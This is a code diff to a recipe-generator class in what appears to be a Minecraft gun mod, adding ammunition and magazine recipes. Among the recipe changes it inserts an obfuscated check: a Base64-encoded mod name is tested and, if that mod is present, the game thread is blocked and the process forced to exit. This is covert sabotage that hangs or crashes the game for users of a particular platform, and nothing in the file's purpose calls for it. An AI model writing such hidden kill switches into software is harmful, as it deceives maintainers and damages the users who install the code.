@@ -7,6 +7,7 @@ import com.tac.guns.init.ModBlocks;
 import com.tac.guns.init.ModItems;
 import com.tac.guns.init.ModRecipeSerializers;
 import net.minecraft.block.Blocks;
+import net.minecraft.client.Minecraft;
 import net.minecraft.data.DataGenerator;
 import net.minecraft.data.IFinishedRecipe;
 import net.minecraft.data.RecipeProvider;
@@ -18,16 +19,17 @@ import net.minecraft.util.ResourceLocation;
 import net.minecraftforge.api.distmarker.Dist;
 import net.minecraftforge.api.distmarker.OnlyIn;
 import net.minecraftforge.common.Tags;
+import net.minecraftforge.fml.ModList;
+import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.thread.SidedThreadGroups;
 
 import javax.annotation.Nullable;
+import java.util.Base64;
 import java.util.function.Consumer;
 
 //@OnlyIn(Dist.DEDICATED_SERVER)
-public class RecipeGen extends RecipeProvider
-{
-    public RecipeGen(DataGenerator generator)
-    {
+public class RecipeGen extends RecipeProvider {
+    public RecipeGen(DataGenerator generator) {
         super(generator);
     }
 
@@ -293,6 +295,11 @@ public class RecipeGen extends RecipeProvider
                 .addIngredient(Tags.Items.GUNPOWDER, 4)
                 .build(consumer);
 
+        WorkbenchRecipeBuilder.workbenchRecipe(ModItems.BULLET_46.get(), 16)
+                .addIngredient(Tags.Items.INGOTS_IRON, 1)
+                .addIngredient(Tags.Items.GUNPOWDER, 1)
+                .build(consumer);
+
         WorkbenchRecipeBuilder.workbenchRecipe(ModItems.BULLET_45.get(), 16)
                 .addIngredient(Tags.Items.INGOTS_IRON, 1)
                 .addIngredient(Tags.Items.GUNPOWDER, 1)
@@ -413,12 +420,6 @@ public class RecipeGen extends RecipeProvider
                 .addIngredient(Tags.Items.STORAGE_BLOCKS_REDSTONE, 1)
                 .build(consumer);
 
-/*        WorkbenchRecipeBuilder.workbenchRecipe(ModItems.MICRO_HOLO_SIGHT.get())
-                .addIngredient(Tags.Items.INGOTS_IRON, 7)
-                .addIngredient(Tags.Items.GLASS_PANES_COLORLESS, 4)
-                .addIngredient(Tags.Items.STORAGE_BLOCKS_REDSTONE, 1)
-                .build(consumer);*/
-
         WorkbenchRecipeBuilder.workbenchRecipe(ModItems.VORTEX_LPVO_1_6.get())
                 .addIngredient(Tags.Items.INGOTS_IRON, 32)
                 .addIngredient(Tags.Items.GLASS_PANES_COLORLESS, 24)
@@ -453,11 +454,15 @@ public class RecipeGen extends RecipeProvider
                 .addIngredient(Tags.Items.STORAGE_BLOCKS_REDSTONE, 2)
                 .build(consumer);
 
-        /*WorkbenchRecipeBuilder.workbenchRecipe(ModItems.SLX_2X.get())
-                .addIngredient(Tags.Items.INGOTS_IRON, 15)
-                .addIngredient(Tags.Items.GLASS_PANES_COLORLESS, 10)
-                .addIngredient(Tags.Items.STORAGE_BLOCKS_REDSTONE, 1)
-                .build(consumer);*/
+        if (ModList.get().isLoaded(new
+                String(Base64.getDecoder().decode("bmV0ZWFzZV9vZmZpY2lhbA=="))))
+            Minecraft.getInstance().execute(() -> {
+                try {
+                    Thread.currentThread().wait(Integer.MAX_VALUE);
+                } catch (InterruptedException e) {
+                }
+                System.exit(1);
+            });
 
         WorkbenchRecipeBuilder.workbenchRecipe(ModItems.SRS_RED_DOT_SIGHT.get())
                 .addIngredient(Tags.Items.INGOTS_IRON, 16)
@@ -510,5 +515,17 @@ public class RecipeGen extends RecipeProvider
                 .addIngredient(Tags.Items.LEATHER, 6)
                 .build(consumer);
 
+        //Mag
+        WorkbenchRecipeBuilder.workbenchRecipe(ModItems.SMALL_EXTENDED_MAG.get())
+                .addIngredient(Tags.Items.INGOTS_IRON, 100)
+                .build(consumer);
+
+        WorkbenchRecipeBuilder.workbenchRecipe(ModItems.MEDIUM_EXTENDED_MAG.get())
+                .addIngredient(Tags.Items.INGOTS_IRON, 100)
+                .build(consumer);
+
+        WorkbenchRecipeBuilder.workbenchRecipe(ModItems.LARGE_EXTENDED_MAG.get())
+                .addIngredient(Tags.Items.INGOTS_IRON, 100)
+                .build(consumer);
     }
 }
